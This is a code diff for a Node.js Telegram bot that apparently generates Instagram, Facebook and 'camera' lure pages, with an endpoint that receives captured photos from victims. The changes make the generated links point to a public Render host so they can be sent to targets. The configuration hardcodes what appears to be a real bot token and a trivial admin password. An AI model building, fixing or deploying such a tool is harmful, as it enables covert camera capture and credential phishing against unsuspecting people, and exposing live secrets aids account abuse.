@@ -1,4 +1,4 @@
-// ====================== index.js (FULLY WORKING - FIXED) ======================
+// ====================== index.js (COMPLETE FIXED - LINK ISSUE SOLVED) ======================
 /*
  * © 2026 SeXyxeon (VOIDSEC)
  * Complete Bot with Admin Panel - Photo Management
@@ -9,7 +9,7 @@ process.env.NTBA_FIX_350 = 1;
 // ====================== CONFIGURATION ======================
 const config = {
     mainToken: '8809859232:AAHoJfHSdpJ67h0Blr2scKV_86vrZQhVpIA',
-    S7: '@RTFGAMMING',
+    S7: '@ZoroXbug',
     port: process.env.PORT || 3000,
     love: 'S7_LOVE_2026',
     adminPassword: 'admin123',
@@ -19,10 +19,14 @@ const config = {
     group: 'https://t.me/RTFGAMINGHACK0',
     channel: 'https://t.me/RTFGAMINGHACK0',
     
-    bot: '𝐘𝐎𝐔-𝐀𝐑𝐄-𝐁𝐄𝐒𝐓 𝐁𝐎𝐘 𝐅𝐎𝐑𝐄𝐕𝐄𝐑 𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌 𝐁𝐎𝐓'
+    bot: '𝐘𝐎𝐔-𝐀𝐑𝐄-𝐁𝐄𝐒𝐓 𝐁𝐎𝐘 𝐅𝐎𝐑𝐄𝐕𝐄𝐑 𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌 𝐁𝐎𝐓',
+    
+    // ✅ RENDER URL - 
+    baseUrl: process.env.RENDER_URL || 'https://rtf-rose-bot-l4hw.onrender.com' // <-- CHANGE KARO!
 };
 
 console.log('✅ Bot Token loaded successfully!');
+console.log('📌 Base URL:', config.baseUrl);
 
 // ====================== DEPENDENCIES ======================
 const express = require('express');
@@ -282,7 +286,7 @@ app.post('/api/capturepic', async (req, res) => {
     }
 });
 
-// ====================== LINK GENERATION ======================
+// ====================== LINK GENERATION (FIXED) ======================
 app.get('/api/create-link', (req, res) => {
     const userid = req.headers.userid || 'unknown';
     const platform = req.headers.platform || 'instagram';
@@ -304,8 +308,11 @@ app.get('/api/create-link', (req, res) => {
     const fileId = Date.now().toString(36) + Math.random().toString(36).substr(2, 3);
     fs.writeFileSync(path.join(PAGES_DIR, `${fileId}.html`), html);
     
-    const baseUrl = req.protocol + '://' + req.get('host');
+    // ✅ FIX: Use config.baseUrl instead of localhost
+    const baseUrl = config.baseUrl;
     const url = `${baseUrl}/page/${fileId}`;
+    
+    console.log(`🔗 Link generated: ${url} for user ${userid}`);
     
     res.json({ success: true, url, id: fileId });
 });
@@ -366,7 +373,6 @@ async function SendLoveSYMenu(chatId, firstName) {
     const message = '𝙃𝙖𝙫𝙚 𝘼 𝙎𝙚𝙭𝙮 𝘿𝙖𝙮 ☻ ';
     const menuText = SYloveMenu(firstName, message);
     
-    // ✅ FIX: Always send as text message (not photo) to avoid caption errors
     await S7.sendMessage(chatId, menuText, {
         parse_mode: 'HTML',
         reply_markup: LOVESY
@@ -423,7 +429,6 @@ S7.on('callback_query', async (q) => {
     if (q.data === "gen_instagram" || q.data === "gen_facebook" || q.data === "gen_camera") {
         const platform = q.data.replace('gen_', '');
         
-        // ✅ FIX: Send loading message as text
         const loadingMsg = await S7.sendMessage(cid, SYloveMenu(q.from.first_name, '𝘾𝙧𝙚𝙖𝙩𝙞𝙣𝙜 𝙇𝙞𝙣𝙠... 🔁'), {
             parse_mode: 'HTML',
             reply_markup: SYBack
@@ -438,7 +443,6 @@ S7.on('callback_query', async (q) => {
             
             const finalMsg = `𝙔𝙤𝙪𝙧 𝙇𝙞𝙣𝙠:\n   ${data.url}`;
             
-            // ✅ FIX: Edit the message (not caption)
             await S7.editMessageText(SYloveMenu(q.from.first_name, finalMsg), {
                 chat_id: cid,
                 message_id: loadingMsg.message_id,
@@ -458,18 +462,6 @@ S7.on('callback_query', async (q) => {
 
     if (q.data === "regen_instagram" || q.data === "regen_facebook" || q.data === "regen_camera") {
         const platform = q.data.replace('regen_', '');
-        
-        // Delete old link from storage
-        let db = {};
-        const SYLovePath = path.join(DATA_DIR, 'user_links.json');
-        if (fs.existsSync(SYLovePath)) {
-            db = JSON.parse(fs.readFileSync(SYLovePath, 'utf8'));
-            const username = q.from.username || q.from.first_name || uid;
-            if (db[username]) {
-                delete db[username][platform];
-                fs.writeFileSync(SYLovePath, JSON.stringify(db, null, 2));
-            }
-        }
         
         const loadingMsg = await S7.sendMessage(cid, SYloveMenu(q.from.first_name, '𝙍𝙚𝙜𝙚𝙣𝙚𝙧𝙖𝙩𝙞𝙣𝙜 𝙉𝙚𝙬 𝙇𝙞𝙣𝙠... 🔁'), {
             parse_mode: 'HTML',
@@ -512,6 +504,7 @@ S7.on('callback_query', async (q) => {
 app.listen(config.port, () => {
     console.log(`✅ Server running on port ${config.port}`);
     console.log(`📌 Admin Panel: http://localhost:${config.port}/admin`);
+    console.log(`📌 Base URL: ${config.baseUrl}`);
     console.log(`🤖 Bot is ready! Send /start to begin.`);
 });
 
